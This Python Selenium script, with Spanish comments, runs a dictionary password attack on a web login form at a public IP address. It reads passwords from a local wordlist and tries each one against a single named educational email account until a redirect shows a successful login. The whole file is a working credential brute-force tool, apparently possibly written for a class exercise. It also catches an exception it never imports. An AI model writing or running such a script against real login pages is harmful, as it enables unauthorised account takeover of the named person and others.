from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import time





driver = webdriver.Chrome() 
url = "http://49.13.155.184:8081"
#url="http://localhost:4200"
driver.get(url)


email_input = driver.find_element("id", "email")
password_input = driver.find_element("id", "password")
login_button = driver.find_element(By.XPATH, "//*[@id='bto_login']/button")

# Ruta al archivo de contraseñas
archivo_password = ".\\password\\diccionario.txt"


list_password = []

# Leer contraseñas desde el archivo
with open(archivo_password, "r") as file:
    list_password = [line.strip() for line in file]

# Variable para indicar si se inició sesión
inicio_sesion_exitoso = False


for password in list_password:
    wait = WebDriverWait(driver, timeout=2)
  

    try:
        email_input.clear() 
        password_input.clear()
        email_input.send_keys("alberto.madera@educa.madrid.org")
        password_input.send_keys(password)
        print(f"probando con esta : {password}")
       

        actions = ActionChains(driver)
        actions.click(login_button).pause(0.5).perform()
        print("Botón de inicio de sesión clicado.") 
        
        
        if "/user-table" in driver.current_url:
            inicio_sesion_exitoso = True
            print(f"Inicio de sesión exitoso. Contraseña utilizada: {password}")
            break  # Detener el bucle si se inicia sesión correctamente

    
        wait.until(lambda d : login_button.is_displayed())    
    except StaleElementReferenceException:
        pass
    except Exception as e:
        print(f"No se pudo hacer clic en el botón de inicio de sesión: {str(e)}")

        

 
# Si no se inicia sesión correctamente
if not inicio_sesion_exitoso:
    print("No se pudo iniciar sesión con ninguna contraseña.")

# Cierra el navegador al final

driver.quit()
